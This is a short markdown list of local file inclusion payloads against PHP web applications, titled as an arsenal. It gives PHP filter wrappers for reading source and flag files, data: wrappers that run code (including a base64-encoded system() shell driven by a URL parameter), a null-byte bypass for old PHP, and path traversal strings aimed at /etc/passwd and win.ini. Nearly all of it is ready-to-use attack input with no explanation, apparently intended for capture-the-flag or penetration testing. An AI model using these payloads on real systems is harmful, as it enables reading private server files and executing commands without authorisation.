# LFI Payloads Arsenal

## PHP Wrappers
php://filter/convert.base64-encode/resource=index.php
php://filter/resource=flag.txt
php://filter/convert.base64-encode|convert.base64-decode/resource=index.php
data:text/plain,<?php phpinfo(); ?>
data:,<?system(['x']);?>&x=ls
data:;base64,PD9zeXN0ZW0oJF9HRVRbJ3gnXSk7Pz4=&x=ls

## Null Byte (PHP < 5.3.4)
?page=../../../etc/passwd%00

## Path Traversal
../../../../etc/passwd
../../../../../../etc/passwd
../../../../windows/win.ini
